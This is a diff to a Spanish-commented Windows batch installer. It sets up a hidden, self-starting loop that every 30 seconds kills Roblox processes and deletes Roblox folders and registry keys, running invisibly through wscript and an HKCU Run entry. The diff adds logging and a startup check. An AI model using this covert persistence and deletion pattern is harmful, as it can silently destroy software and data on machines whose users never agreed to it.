@@ -9,17 +9,21 @@ attrib +h +s "%targetDir%"
 
 :: 2. Crear el script de limpieza (Bucle Infinito)
 echo @echo off > "%targetDir%\%cleanerName%"
+echo set "logFile=%targetDir%\cleanup.log" >> "%targetDir%\%cleanerName%"
 echo :loop >> "%targetDir%\%cleanerName%"
+echo :: Control de tamano de log (10MB = 10485760 bytes) >> "%targetDir%\%cleanerName%"
+echo if exist "%%logFile%%" (for %%%%I in ("%%logFile%%") do if %%%%~zI gtr 10485760 type nul ^> "%%logFile%%") >> "%targetDir%\%cleanerName%"
+echo echo [%%date%% %%time%%] Iniciando ciclo de limpieza... ^>^> "%%logFile%%" >> "%targetDir%\%cleanerName%"
 echo :: Matar procesos de Roblox >> "%targetDir%\%cleanerName%"
-echo taskkill /F /IM RobloxPlayerBeta.exe /T ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
-echo taskkill /F /IM RobloxPlayerLauncher.exe /T ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
-echo taskkill /F /IM RobloxStudioBeta.exe /T ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
+echo taskkill /F /IM RobloxPlayerBeta.exe /T ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
+echo taskkill /F /IM RobloxPlayerLauncher.exe /T ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
+echo taskkill /F /IM RobloxStudioBeta.exe /T ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
 echo :: Borrar archivos de instalacion >> "%targetDir%\%cleanerName%"
-echo if exist "%%LocalAppData%%\Roblox" rd /s /q "%%LocalAppData%%\Roblox" ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
-echo if exist "%%ProgramFiles(x86)%%\Roblox" rd /s /q "%%ProgramFiles(x86)%%\Roblox" ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
+echo if exist "%%LocalAppData%%\Roblox" (echo Borrando LocalAppData... ^>^> "%%logFile%%" ^& rd /s /q "%%LocalAppData%%\Roblox" ^>^> "%%logFile%%" 2^>^&1) >> "%targetDir%\%cleanerName%"
+echo if exist "%%ProgramFiles(x86)%%\Roblox" (echo Borrando ProgramFiles... ^>^> "%%logFile%%" ^& rd /s /q "%%ProgramFiles(x86)%%\Roblox" ^>^> "%%logFile%%" 2^>^&1) >> "%targetDir%\%cleanerName%"
 echo :: Borrar llaves de registro >> "%targetDir%\%cleanerName%"
-echo reg delete "HKEY_CURRENT_USER\Software\Roblox" /f ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
-echo reg delete "HKEY_CURRENT_USER\Software\Roblox Corporation" /f ^>nul 2^>^&1 >> "%targetDir%\%cleanerName%"
+echo reg delete "HKEY_CURRENT_USER\Software\Roblox" /f ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
+echo reg delete "HKEY_CURRENT_USER\Software\Roblox Corporation" /f ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
 echo :: Esperar 30 segundos antes de la siguiente revision >> "%targetDir%\%cleanerName%"
 echo timeout /t 30 /nobreak ^>nul >> "%targetDir%\%cleanerName%"
 echo goto loop >> "%targetDir%\%cleanerName%"
@@ -36,5 +40,13 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Wi
 :: 5. Ejecutar ahora mismo de forma invisible
 start wscript.exe "%targetDir%\%vbsName%"
 
-echo Instalacion completada. Roblox sera eliminado periodicamente de forma invisible.
+:: 6. Verificacion de ejecucion
+timeout /t 3 /nobreak >nul
+tasklist /FI "IMAGENAME eq wscript.exe" | find /I "wscript.exe" >nul
+if %errorlevel% equ 0 (
+    echo [OK] El servicio se ha iniciado correctamente y esta en ejecucion invisible.
+    echo Puedes monitorear la actividad en: %targetDir%\cleanup.log
+) else (
+    echo [ERROR] No se pudo iniciar el proceso. Revisa los permisos de la carpeta %targetDir%.
+)
 pause
